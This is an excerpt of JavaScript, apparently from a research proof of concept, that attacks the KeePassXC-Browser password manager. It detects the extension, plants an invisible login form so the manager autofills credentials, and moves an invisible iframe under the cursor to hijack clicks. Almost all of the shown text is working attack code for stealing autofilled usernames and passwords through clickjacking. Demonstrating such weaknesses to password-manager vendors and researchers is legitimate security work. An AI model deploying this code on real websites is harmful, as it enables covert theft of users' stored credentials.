...
window.setTimeout(function(){
    if (!document.getElementById("password").value && !document.getElementById("username").value) {
        if (getComputedStyle(document.body).getPropertyValue('--kpxc-background-color')) {
                document.getElementById("divlogin").style = "position: absolute; bottom: 0; left: 0; right: 0; z-index: 9999999; opacity:0.0000001";
                clickjacking();
                showDialog();
        } else {
            alert("You don't have KeePassXC-Browser installed.");
        }
...
function createLoginForm() {
    ...
    footerholder.id = 'holder';
    footerholder.style = 'min-height: 100%;position:relative;';
    document.getElementsByTagName('body')[0].appendChild(footerholder);

	var divlogin = document.createElement("div");
	divlogin.id = "divlogin";
	divlogin.style = "position: absolute; bottom: 0; left: 0; right: 0; z-index: -9999999; opacity:0.000000001";
	divlogin.innerHTML  = ' \
			<form method="POST" action="login.html" id="form" onchange="getFormValues()" style="opacity:0.000000001;"> \
				<input type="username" id="username" name="username" autocomplete=on style="width:100px" required> \
				<input type="password" id="password" name="password" size="15" autocomplete=on required> \
				<button type="submit" id="submit">Login</button> \
			</form>';
	footerholder.appendChild(divlogin);
}

function removeSubmitButton() {
  if (document.getElementById("btnLogin")) {
        var element = document.getElementById("form");
        var child = document.getElementById("btnLogin");
...
function getMousePosition(e) {
    ...
    document.getElementById("invisible_iframe").style.top = (tempY-5) + "px";
    document.getElementById("invisible_iframe").style.left = (tempX-15) + "px";
    return true;
}


function clickjacking() {
    var invisibleIframe = document.createElement("div");
    invisibleIframe.innerHTML = '<style>#invisible_iframe {position: absolute; width: 15px; height: 15px; overflow: hidden; opacity:0; margin-left: 10px; z-index: 999998;} #backimg {opacity: 0; position: fixed; display: block; width: 100%; height: 100%; top: 0; left: 0; right: 0; bottom: 0; z-index: 999997;}</style> \
                        <img id="backimg" onMouseMove="getMousePosition(event)">\
                        <div id="invisible_iframe">\
                        <iframe id="iframe" src="https://websecurity.dev/password-managers/clickjacking/index.html" scrolling="no" style="opacity:0; position: relative;top: -1429px;left: -101px;height: 2557px; z-index: 999999;"></iframe></div>';
